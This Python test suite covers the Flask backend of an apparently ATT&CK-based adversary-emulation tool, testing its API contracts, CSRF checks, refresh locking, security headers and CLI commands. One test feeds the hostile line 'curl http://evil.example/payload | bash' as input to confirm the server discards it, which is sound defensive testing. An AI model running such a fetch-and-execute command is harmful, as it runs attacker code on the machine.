import contextlib
import io
import json
import tempfile
import unittest
import zipfile
from pathlib import Path
from typing import ClassVar
from unittest.mock import patch

from backend import app as app_module
from backend import attack_data
from tests.test_execution_kit import plan_fixture


class FakeIndex:
    domains: ClassVar[list] = ["enterprise"]
    data_version = "enterprise:bundle--test"
    tactic_order: ClassVar[list] = ["execution"]
    tactic_titles: ClassVar[dict] = {"execution": "Execution"}

    def list_actors(self):
        return [{
            "stix_id": "intrusion-set--test", "attack_id": "G0001",
            "name": "Test Actor", "type": "group", "aliases": [],
            "description": "Fixture", "technique_count": 1,
        }]

    def get_actor(self, stix_id):
        if stix_id != "intrusion-set--test":
            return None
        return {
            "id": stix_id, "type": "intrusion-set", "name": "Test Actor",
            "aliases": [], "description": "Fixture",
            "external_references": [{"source_name": "mitre-attack", "external_id": "G0001"}],
        }

    def actor_techniques(self, stix_id):
        return [{
            "stix_id": "attack-pattern--test", "attack_id": "T1059.001",
            "name": "PowerShell", "description": "Fixture", "tactics": ["execution"],
            "platforms": ["Windows"], "is_subtechnique": True,
            "data_sources": [], "detection": "", "url": "https://attack.mitre.org/",
        }]


class ApiContractTests(unittest.TestCase):
    def setUp(self):
        app_module.app.config.update(TESTING=True)
        app_module.REMOTE_MODE = False
        app_module.API_TOKEN = ""
        app_module._runtime.update(ready=False, loading=False, phase="not_started", error="ATT&CK data has not been loaded")
        self.client = app_module.app.test_client()

    @patch("backend.app.attack_data.loaded_index_status", return_value={"ready": False, "domain_sets": [], "data_versions": []})
    def test_health_is_degraded_before_data_is_ready(self, _status):
        response = self.client.get("/api/health")
        self.assertEqual(response.status_code, 503)
        self.assertFalse(response.get_json()["ready"])

    @patch("backend.app.attack_data.loaded_index_status", return_value={"ready": True, "domain_sets": [["enterprise"]], "data_versions": ["fixture"]})
    def test_health_is_ready_after_successful_load(self, _status):
        app_module._runtime.update(ready=True, error=None)
        response = self.client.get("/api/health")
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.get_json()["ready"])

    @patch("backend.app.attack_data.get_index", return_value=FakeIndex())
    def test_actor_response_has_versioned_metadata(self, _index):
        response = self.client.get("/api/actors?domains=enterprise")
        body = response.get_json()
        self.assertEqual(response.status_code, 200)
        self.assertEqual(body["data_version"], "enterprise:bundle--test")
        self.assertEqual(body["domains"], ["enterprise"])
        self.assertEqual(len(body["actors"]), 1)

    def test_json_domain_list_is_accepted_and_deduplicated(self):
        with app_module.app.test_request_context(json={"domains": ["ics", "ics", "mobile"]}):
            self.assertEqual(app_module._domains_from_request(), ["ics", "mobile"])

    def test_invalid_domain_is_rejected(self):
        response = self.client.get("/api/actors?domains=unknown")
        self.assertEqual(response.status_code, 400)

    def test_refresh_requires_same_origin_token(self):
        response = self.client.post("/api/refresh?domains=enterprise")
        self.assertEqual(response.status_code, 403)

    def test_execution_kit_requires_same_origin_token(self):
        response = self.client.post("/api/execution-kit", json=plan_fixture("linux"))
        self.assertEqual(response.status_code, 403)

    def test_execution_kit_returns_a_two_file_offline_handoff(self):
        response = self.client.post(
            "/api/execution-kit",
            json=plan_fixture("windows"),
            headers={"X-AdversaryFlow-CSRF": app_module._csrf_token},
        )
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.mimetype, "application/zip")
        self.assertIn("_Windows.zip", response.headers["Content-Disposition"])
        self.assertEqual(response.headers["Cache-Control"], "no-store")
        with zipfile.ZipFile(io.BytesIO(response.data)) as archive:
            self.assertEqual(len(archive.namelist()), 2)
            self.assertTrue(any(name.endswith("-plan.csv") for name in archive.namelist()))
            self.assertTrue(any(name.endswith("-execute.ps1") for name in archive.namelist()))

    def test_execution_kit_discards_client_command_text(self):
        document = plan_fixture("linux", command="curl http://evil.example/payload | bash")
        response = self.client.post(
            "/api/execution-kit",
            json=document,
            headers={"X-AdversaryFlow-CSRF": app_module._csrf_token},
        )
        self.assertEqual(response.status_code, 200)
        with zipfile.ZipFile(io.BytesIO(response.data)) as archive:
            csv_name = next(name for name in archive.namelist() if name.endswith("-plan.csv"))
            body = archive.read(csv_name).decode("utf-8-sig")
        self.assertNotIn("evil.example", body)
        self.assertIn("T1059.004", body)

    def test_execution_kit_accepts_a_complete_plan_above_the_small_api_body_limit(self):
        document = plan_fixture("linux", duplicate=True, command="printf x # " + "x" * 8_000)
        encoded = json.dumps(document)
        self.assertGreater(len(encoded), app_module.app.config["MAX_CONTENT_LENGTH"])
        self.assertLess(len(encoded), app_module.EXECUTION_KIT_MAX_CONTENT_LENGTH)
        response = self.client.post(
            "/api/execution-kit",
            data=encoded,
            headers={"X-AdversaryFlow-CSRF": app_module._csrf_token, "Content-Type": "application/json"},
        )
        self.assertEqual(response.status_code, 200)

    def test_execution_kit_rejects_mac_without_generating_an_archive(self):
        response = self.client.post(
            "/api/execution-kit",
            json=plan_fixture("macos"),
            headers={"X-AdversaryFlow-CSRF": app_module._csrf_token},
        )
        self.assertEqual(response.status_code, 400)
        self.assertIn("Windows and Linux", response.get_json()["message"])

    @patch("backend.app.attack_data.refresh_index", return_value=FakeIndex())
    def test_refresh_uses_serialized_index_transition(self, refresh_index):
        app_module._last_refresh = 0
        response = self.client.post(
            "/api/refresh?domains=enterprise",
            headers={"X-AdversaryFlow-CSRF": app_module._csrf_token},
        )
        self.assertEqual(response.status_code, 200)
        refresh_index.assert_called_once_with(["enterprise"])
        self.assertEqual(response.get_json()["data_version"], "enterprise:bundle--test")

    def test_non_loopback_binding_requires_explicit_opt_in(self):
        self.assertTrue(app_module._is_loopback_host("127.0.0.1"))
        self.assertFalse(app_module._is_loopback_host("0.0.0.0"))
        self.assertEqual(app_module.main(["--host", "0.0.0.0", "--no-preload"]), 2)
        self.assertEqual(app_module.main(["--host", "0.0.0.0", "--allow-remote", "--no-preload"]), 2)

    def test_remote_api_requires_configured_bearer_token(self):
        app_module.REMOTE_MODE = True
        app_module.API_TOKEN = "test-secret"
        self.assertEqual(self.client.get("/api/session").status_code, 401)
        response = self.client.get("/api/session", headers={"Authorization": "Bearer test-secret"})
        self.assertEqual(response.status_code, 200)

    def test_cache_refresh_rejects_unknown_cli_domain(self):
        self.assertEqual(app_module.main(["cache-refresh", "--domains", "unknown"]), 2)

    @patch("backend.app.attack_data.get_index", return_value=FakeIndex())
    def test_workflow_response_has_metadata(self, _index):
        response = self.client.get("/api/workflow/intrusion-set--test")
        body = response.get_json()
        self.assertEqual(response.status_code, 200)
        self.assertEqual(body["metadata"]["data_version"], "enterprise:bundle--test")
        self.assertEqual(body["summary"]["total_techniques"], 1)
        technique = body["stages"][0]["techniques"][0]
        self.assertIn("commands", technique)
        self.assertIn("command_source", technique)
        self.assertNotIn("benign", technique)
        self.assertNotIn("benign_source", technique)

    def test_liveness_is_independent_of_attack_data(self):
        response = self.client.get("/api/live")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.get_json()["status"], "live")
        self.assertEqual(response.get_json()["version"], app_module.__version__)

    @patch("backend.app.attack_data.get_index", side_effect=RuntimeError("fixture failure"))
    def test_api_exceptions_are_structured(self, _index):
        app_module._runtime.update(ready=True, loading=False, phase="ready", error=None)
        response = self.client.get("/api/actors")
        self.assertEqual(response.status_code, 500)
        self.assertEqual(response.get_json()["error"], "request failed")
        self.assertTrue(app_module._runtime["ready"])
        self.assertEqual(app_module._runtime["phase"], "ready")

    @patch("backend.app.attack_data.get_index", return_value=FakeIndex())
    def test_unknown_actor_returns_the_documented_error_envelope(self, _index):
        response = self.client.get("/api/workflow/intrusion-set--missing")
        self.assertEqual(response.status_code, 404)
        body = response.get_json()
        self.assertEqual(body["error"], "actor_not_found")
        self.assertIn("intrusion-set--missing", body["message"])
        self.assertEqual(body["version"], app_module.__version__)

    @patch("backend.app.attack_data.get_index", return_value=FakeIndex())
    def test_workflow_no_longer_emits_unmapped_techniques(self, _index):
        body = self.client.get("/api/workflow/intrusion-set--test").get_json()
        self.assertNotIn("unmapped", body)
        self.assertEqual(set(body), {"actor", "summary", "kill_chain", "stages", "metadata"})

    @patch("backend.app.attack_data.get_index", return_value=FakeIndex())
    def test_workflow_drops_techniques_outside_the_kill_chain(self, _index):
        """A technique whose tactics are absent from the matrix is simply not placed."""
        class OrphanIndex(FakeIndex):
            def actor_techniques(self, stix_id):
                return [{
                    "stix_id": "attack-pattern--orphan", "attack_id": "T9999", "name": "Orphan",
                    "description": "Fixture", "tactics": ["not-a-tactic"], "platforms": [],
                    "is_subtechnique": False, "data_sources": [], "detection": "", "url": None,
                }]

        with patch("backend.app.attack_data.get_index", return_value=OrphanIndex()):
            body = self.client.get("/api/workflow/intrusion-set--test").get_json()
        self.assertEqual(body["stages"], [])
        self.assertEqual(body["summary"]["total_techniques"], 1)


class RefreshLockTests(unittest.TestCase):
    """Regression cover for the refresh lock leaking on a rejected request."""

    def setUp(self):
        app_module.app.config.update(TESTING=True)
        app_module.REMOTE_MODE = False
        app_module.API_TOKEN = ""
        app_module._runtime.update(ready=False, loading=False, phase="not_started", error=None)
        self.client = app_module.app.test_client()
        self.headers = {"X-AdversaryFlow-CSRF": app_module._csrf_token}

    def test_invalid_domain_does_not_wedge_later_refreshes(self):
        app_module._last_refresh = 0
        rejected = self.client.post("/api/refresh?domains=bogus", headers=self.headers)
        self.assertEqual(rejected.status_code, 400)
        self.assertFalse(app_module._refresh_lock.locked())

        app_module._last_refresh = 0
        with patch("backend.app.attack_data.refresh_index", return_value=FakeIndex()), \
                patch("backend.app.attack_data.cache_status", return_value={}):
            accepted = self.client.post("/api/refresh?domains=enterprise", headers=self.headers)
        self.assertEqual(accepted.status_code, 200)
        self.assertFalse(app_module._refresh_lock.locked())

    def test_refresh_releases_the_lock_when_the_rebuild_fails(self):
        app_module._last_refresh = 0
        with patch("backend.app.attack_data.refresh_index", side_effect=RuntimeError("boom")):
            response = self.client.post("/api/refresh?domains=enterprise", headers=self.headers)
        self.assertEqual(response.status_code, 500)
        self.assertFalse(app_module._refresh_lock.locked())
        self.assertFalse(app_module._runtime["loading"])

    def test_refresh_is_rate_limited(self):
        app_module._last_refresh = 0
        with patch("backend.app.attack_data.refresh_index", return_value=FakeIndex()), \
                patch("backend.app.attack_data.cache_status", return_value={}):
            self.assertEqual(self.client.post("/api/refresh", headers=self.headers).status_code, 200)
            self.assertEqual(self.client.post("/api/refresh", headers=self.headers).status_code, 429)

    def test_refresh_is_rejected_while_bootstrap_is_loading(self):
        app_module._last_refresh = 0
        app_module._runtime.update(loading=True)
        try:
            response = self.client.post("/api/refresh", headers=self.headers)
        finally:
            app_module._runtime.update(loading=False)
        self.assertEqual(response.status_code, 409)
        self.assertEqual(response.get_json()["error"], "bootstrap_in_progress")


class BootstrapEndpointTests(unittest.TestCase):
    def setUp(self):
        app_module.app.config.update(TESTING=True)
        app_module.REMOTE_MODE = False
        app_module.API_TOKEN = ""
        app_module._runtime.update(ready=False, loading=False, phase="not_started",
                                   error="ATT&CK data has not been loaded")
        self.client = app_module.app.test_client()

    @patch("backend.app.attack_data.cache_status", return_value={"domains": {}})
    def test_get_reports_503_before_bootstrap_starts(self, _cache):
        response = self.client.get("/api/bootstrap")
        self.assertEqual(response.status_code, 503)
        self.assertEqual(response.get_json()["status"], "not_started")

    @patch("backend.app.attack_data.cache_status", return_value={"domains": {}})
    def test_get_reports_202_while_loading(self, _cache):
        app_module._runtime.update(loading=True, phase="loading")
        try:
            response = self.client.get("/api/bootstrap")
        finally:
            app_module._runtime.update(loading=False, phase="not_started")
        self.assertEqual(response.status_code, 202)

    @patch("backend.app.attack_data.cache_status", return_value={"domains": {}})
    def test_get_reports_200_once_ready(self, _cache):
        app_module._runtime.update(ready=True, phase="ready")
        try:
            response = self.client.get("/api/bootstrap")
        finally:
            app_module._runtime.update(ready=False, phase="not_started")
        self.assertEqual(response.status_code, 200)

    def test_post_requires_the_same_origin_token(self):
        response = self.client.post("/api/bootstrap")
        self.assertEqual(response.status_code, 403)
        self.assertEqual(response.get_json()["error"], "forbidden")

    @patch("backend.app.attack_data.cache_status", return_value={"domains": {}})
    @patch("backend.app.threading.Thread")
    def test_post_starts_the_background_worker(self, thread, _cache):
        response = self.client.post("/api/bootstrap",
                                    headers={"X-AdversaryFlow-CSRF": app_module._csrf_token})
        try:
            self.assertIn(response.status_code, (200, 202))
            thread.assert_called_once()
            self.assertTrue(app_module._runtime["loading"])
        finally:
            app_module._runtime.update(loading=False, phase="not_started")

    @patch("backend.app.attack_data.cache_status", return_value={"domains": {}})
    def test_post_is_idempotent_while_a_load_is_running(self, _cache):
        app_module._runtime.update(loading=True, phase="loading")
        try:
            response = self.client.post("/api/bootstrap",
                                        headers={"X-AdversaryFlow-CSRF": app_module._csrf_token})
        finally:
            app_module._runtime.update(loading=False, phase="not_started")
        self.assertEqual(response.status_code, 202)
        self.assertEqual(response.get_json()["status"], "already_loading")

    @patch("backend.app.attack_data.get_index", side_effect=RuntimeError("bundle unavailable"))
    def test_worker_records_a_failed_phase(self, _index):
        app_module._bootstrap_worker()
        self.assertEqual(app_module._runtime["phase"], "failed")
        self.assertIn("bundle unavailable", app_module._runtime["error"])
        self.assertFalse(app_module._runtime["loading"])

    @patch("backend.app.attack_data.get_index", return_value=FakeIndex())
    def test_worker_marks_ready_on_success(self, _index):
        app_module._bootstrap_worker()
        self.assertEqual(app_module._runtime["phase"], "ready")
        self.assertTrue(app_module._runtime["ready"])


class ResponseHardeningTests(unittest.TestCase):
    def setUp(self):
        app_module.app.config.update(TESTING=True)
        app_module.REMOTE_MODE = False
        app_module.API_TOKEN = ""
        self.client = app_module.app.test_client()

    def test_every_response_carries_the_security_headers(self):
        response = self.client.get("/api/session")
        self.assertEqual(response.headers["X-Content-Type-Options"], "nosniff")
        self.assertEqual(response.headers["X-Frame-Options"], "DENY")
        self.assertEqual(response.headers["Referrer-Policy"], "no-referrer")
        self.assertEqual(response.headers["Cross-Origin-Resource-Policy"], "same-origin")
        self.assertEqual(response.headers["Cross-Origin-Opener-Policy"], "same-origin")
        self.assertIn("camera=()", response.headers["Permissions-Policy"])
        self.assertEqual(response.headers["Cache-Control"], "no-store")
        self.assertIn("default-src 'self'", response.headers["Content-Security-Policy"])
        self.assertIn("object-src 'none'", response.headers["Content-Security-Policy"])
        self.assertIn("frame-ancestors 'none'", response.headers["Content-Security-Policy"])
        self.assertTrue(response.headers["X-Request-ID"])

    def test_a_supplied_request_id_is_echoed_back(self):
        response = self.client.get("/api/session", headers={"X-Request-ID": "fixture-id"})
        self.assertEqual(response.headers["X-Request-ID"], "fixture-id")

    def test_an_oversized_request_id_is_replaced(self):
        response = self.client.get("/api/session", headers={"X-Request-ID": "x" * 129})
        self.assertNotEqual(response.headers["X-Request-ID"], "x" * 129)
        self.assertRegex(response.headers["X-Request-ID"], r"^[a-f0-9]{32}$")

    def test_request_counters_advance(self):
        before = app_module._runtime_snapshot()["requests_total"]
        self.client.get("/api/session")
        self.assertGreater(app_module._runtime_snapshot()["requests_total"], before)

    def test_frontend_index_and_assets_are_served(self):
        for path in ("/", "/app.js", "/styles.css"):
            with self.subTest(path=path):
                response = self.client.get(path)
                try:
                    self.assertEqual(response.status_code, 200)
                finally:
                    response.close()

    def test_missing_frontend_asset_is_not_json(self):
        response = self.client.get("/does-not-exist.js")
        self.assertEqual(response.status_code, 404)
        self.assertNotIn("application/json", response.headers.get("Content-Type", ""))


class LoggingTests(unittest.TestCase):
    def test_events_below_the_configured_level_are_dropped(self):
        original = app_module.LOG_LEVEL
        app_module.LOG_LEVEL = "warning"
        try:
            stream = io.StringIO()
            with contextlib.redirect_stdout(stream):
                app_module._log_event("quiet", level="info")
                app_module._log_event("loud", level="error", detail="fixture")
        finally:
            app_module.LOG_LEVEL = original
        lines = [json.loads(line) for line in stream.getvalue().splitlines() if line.strip()]
        self.assertEqual([record["event"] for record in lines], ["loud"])
        self.assertEqual(lines[0]["detail"], "fixture")


class FrontendLocationTests(unittest.TestCase):
    def test_an_explicit_override_wins(self):
        with patch.dict(app_module.os.environ, {"ADVERSARYFLOW_FRONTEND_DIR": "~/custom-ui"}):
            resolved = app_module._frontend_dir()
        self.assertEqual(resolved, app_module.os.path.abspath(
            app_module.os.path.expanduser("~/custom-ui")))

    def test_a_source_checkout_uses_the_repository_frontend(self):
        with patch.dict(app_module.os.environ, {}, clear=False):
            app_module.os.environ.pop("ADVERSARYFLOW_FRONTEND_DIR", None)
            resolved = app_module._frontend_dir()
        self.assertTrue(resolved.endswith("frontend"))
        self.assertTrue(Path(resolved, "index.html").is_file())

    def test_an_installed_package_falls_back_to_the_data_directory(self):
        with patch.dict(app_module.os.environ, {}, clear=False):
            app_module.os.environ.pop("ADVERSARYFLOW_FRONTEND_DIR", None)
            with patch.object(Path, "is_dir", return_value=False), \
                    patch("backend.app.sysconfig.get_path", return_value="/opt/env"):
                resolved = app_module._frontend_dir()
        self.assertEqual(Path(resolved),
                         Path("/opt/env") / "share" / "adversaryflow" / "frontend")


class BrowserLaunchTests(unittest.TestCase):
    def setUp(self):
        self.addCleanup(app_module._runtime.update,
                        ready=False, loading=False, phase="not_started")

    def test_the_browser_opens_once_data_is_ready(self):
        app_module._runtime.update(ready=True, phase="ready")
        with patch("backend.app.webbrowser.open") as opener:
            app_module._open_when_ready("http://127.0.0.1:5000")
        opener.assert_called_once_with("http://127.0.0.1:5000")

    def test_the_browser_still_opens_so_a_failure_is_visible(self):
        app_module._runtime.update(ready=False, phase="failed")
        with patch("backend.app.webbrowser.open") as opener:
            app_module._open_when_ready("http://127.0.0.1:5000")
        opener.assert_called_once()

    def test_the_wait_gives_up_at_the_deadline_without_opening(self):
        app_module._runtime.update(ready=False, phase="loading")
        with patch("backend.app.webbrowser.open") as opener, \
                patch("backend.app.time.sleep"), \
                patch("backend.app.time.monotonic", side_effect=[0.0, 1000.0]):
            app_module._open_when_ready("http://127.0.0.1:5000")
        opener.assert_not_called()


class CommandLineTests(unittest.TestCase):
    def setUp(self):
        self.original_cache_dir = attack_data.CACHE_DIR
        self.addCleanup(attack_data.configure_cache_dir, self.original_cache_dir)
        self.addCleanup(attack_data.configure_offline, False)

    def test_parser_defaults_to_a_loopback_serve(self):
        args = app_module._parser().parse_args([])
        self.assertEqual(args.command, "serve")
        self.assertEqual(args.host, "127.0.0.1")
        self.assertEqual(args.port, 5000)
        self.assertFalse(args.allow_remote)

    def test_parser_rejects_an_unknown_command(self):
        with self.assertRaises(SystemExit):
            app_module._parser().parse_args(["teleport"])

    def test_doctor_reports_a_healthy_source_checkout(self):
        with tempfile.TemporaryDirectory() as directory:
            stream = io.StringIO()
            with contextlib.redirect_stdout(stream):
                code = app_module.main(["doctor", "--cache-dir", directory])
            report = json.loads(stream.getvalue())
        self.assertEqual(code, 0)
        self.assertTrue(report["ok"])
        self.assertTrue(report["frontend_available"])
        self.assertTrue(report["cache_writable"])
        self.assertEqual(report["version"], app_module.__version__)

    def test_doctor_fails_when_the_frontend_is_missing(self):
        with tempfile.TemporaryDirectory() as directory:
            stream = io.StringIO()
            with patch.object(app_module, "FRONTEND_DIR", directory), \
                    contextlib.redirect_stdout(stream):
                code = app_module.main(["doctor", "--cache-dir", directory])
            report = json.loads(stream.getvalue())
        self.assertEqual(code, 1)
        self.assertFalse(report["ok"])
        self.assertFalse(report["frontend_available"])

    def test_cache_status_prints_every_known_domain(self):
        with tempfile.TemporaryDirectory() as directory:
            stream = io.StringIO()
            with contextlib.redirect_stdout(stream):
                code = app_module.main(["cache-status", "--cache-dir", directory])
            report = json.loads(stream.getvalue())
        self.assertEqual(code, 0)
        self.assertEqual(set(report["domains"]), set(attack_data.STIX_SOURCES))

    def test_cache_clear_refuses_without_confirmation(self):
        with tempfile.TemporaryDirectory() as directory:
            stream = io.StringIO()
            with contextlib.redirect_stdout(stream):
                code = app_module.main(["cache-clear", "--cache-dir", directory])
        self.assertEqual(code, 2)
        self.assertIn("--yes", stream.getvalue())

    def test_cache_clear_removes_only_known_cache_files(self):
        with tempfile.TemporaryDirectory() as directory:
            attack_data.configure_cache_dir(directory)
            bundle = attack_data._cache_path("enterprise")
            unrelated = f"{directory}/keep-me.txt"
            with open(bundle, "w", encoding="utf-8") as handle:
                handle.write("{}")
            with open(unrelated, "w", encoding="utf-8") as handle:
                handle.write("keep")
            stream = io.StringIO()
            with contextlib.redirect_stdout(stream):
                code = app_module.main(["cache-clear", "--yes", "--cache-dir", directory])
            report = json.loads(stream.getvalue())
            self.assertEqual(code, 0)
            self.assertIn(bundle, report["removed"])
            with open(unrelated, encoding="utf-8") as handle:
                self.assertEqual(handle.read(), "keep")

    def test_cache_refresh_accepts_known_domains(self):
        with tempfile.TemporaryDirectory() as directory, patch("backend.app.attack_data.refresh_index") as refresh_index:
            stream = io.StringIO()
            with contextlib.redirect_stdout(stream):
                code = app_module.main(["cache-refresh", "--domains", "enterprise,ics",
                                        "--cache-dir", directory])
        self.assertEqual(code, 0)
        refresh_index.assert_called_once_with(["enterprise", "ics"])

    def test_offline_flag_is_propagated_to_the_data_layer(self):
        with tempfile.TemporaryDirectory() as directory:
            with contextlib.redirect_stdout(io.StringIO()):
                app_module.main(["cache-status", "--offline", "--cache-dir", directory])
            self.assertTrue(attack_data.OFFLINE)


if __name__ == "__main__":
    unittest.main()
